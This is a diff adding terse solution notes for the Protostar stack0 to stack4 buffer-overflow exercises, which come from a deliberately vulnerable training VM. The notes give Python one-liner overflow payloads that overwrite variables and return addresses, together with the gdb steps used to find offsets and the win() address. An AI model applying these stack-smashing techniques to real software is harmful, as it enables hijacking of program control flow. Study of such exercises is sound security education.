@@ -1,0 +1,37 @@
+stack0:
+python -c "print 'A' * 65" | /opt/protostar/bin/stack0
+
+------
+
+stack1:
+/opt/protostar/bin/stack1 `python -c "print 'A' * 64 + 'dcba'"`
+
+------
+
+stack2:
+export GREENIE=`python -c "print 'A' * 64 + '0a0d0a0d'.decode('hex')"` && /opt/protostar/bin/stack2
+
+------
+
+stack3:
+gdb /opt/protostar/bin/stack3
+info address win
+0x08048424
+python -c "print 'A' * 64 + '24840408'.decode('hex')" | /opt/protostar/bin/stack3
+
+------
+
+stack4:
+python -c "print 'A' * 64 + 'BCDEFGHIJKLMNOPQRSTUVWYZ'" > input
+
+gdb /opt/protostar/bin/stack4
+info address win
+0x080483f4
+gdb run < input
+seg fault: 0x5251504f
+quit
+
+python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" > input
+
+gdb /opt/protostar/bin/stack4
+gdb run < input
